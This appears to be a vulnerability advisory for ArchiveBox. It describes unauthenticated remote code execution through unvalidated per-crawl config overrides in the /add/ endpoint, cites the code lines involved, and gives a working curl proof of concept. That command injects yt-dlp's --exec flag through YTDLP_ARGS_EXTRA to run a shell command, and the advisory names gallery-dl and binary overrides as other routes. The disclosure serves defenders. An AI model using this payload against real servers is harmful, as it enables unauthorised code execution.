summary: "ArchiveBox Vulnerable to RCE via unvalidated per-crawl config overrides in AddView\n\
  The /add/ endpoint (AddView in core/views.py) accepts a config JSON field that gets merged\
  \ into the crawl config without validation. This config is exported as environment variables\
  \ when archive plugins run, allowing injection of arbitrary tool arguments to achieve RCE.\n\
  \nWhen PUBLIC_ADD_VIEW=True (common for bookmarklet usage), this is exploitable without authentication.\
  \ The endpoint is also @csrf_exempt.\n\nAffected code:\n\ncore/views.py:887 - user config\
  \ extracted with no validation:\n\n```python\ncustom_config = form.cleaned_data.get(\"config\"\
  ) or {}\n```\n\ncore/views.py:918 - merged into crawl config:\n\n```python\nconfig.update(custom_config)\n\
  ```\n\nconfig/configset.py:255-256 - crawl config applied with high priority:\n\n```python\n\
  if crawl and hasattr(crawl, \"config\") and crawl.config:\n    config.update(crawl.config)\n\
  ```\n\nhooks.py:398-411 - config exported as env vars:\n\n```python\nfor key, value in config.items():\n\
  \    if key in SKIP_KEYS: continue\n    env[key] = str(value)\n```\n\nplugins/ytdlp/on_Snapshot__02_ytdlp.bg.py:122-123\
  \ - env var args passed to yt-dlp:\n\n```python\nytdlp_args_extra = get_env_array(\"YTDLP_ARGS_EXTRA\"\
  , [])\ncmd.extend(ytdlp_args_extra)\n```\n\nPoC (pre-auth when PUBLIC_ADD_VIEW=True):\n\n\
  ```bash\ncurl -X POST http://localhost:8000/add/ \\\n  -d \"url=https://www.youtube.com/watch?v=dQw4w9WgXcQ\"\
  \ \\\n  -d \"depth=0\" \\\n  -d \"config={\\\"YTDLP_ARGS_EXTRA\\\": \\\"[\\\\\\\"--exec\\\\\
  \\\", \\\\\\\"id > /tmp/pwned\\\\\\\"]\\\"}\" \n```\n\nAfter the crawl runs, yt-dlp executes\
  \ id > /tmp/pwned via its --exec flag.\n\nSame approach works with GALLERYDL_ARGS_EXTRA (gallery-dl\
  \ --exec), or overriding any *_BINARY key.\n\nImpact: Remote code execution on the ArchiveBox\
  \ server. Pre-auth when PUBLIC_ADD_VIEW=True."
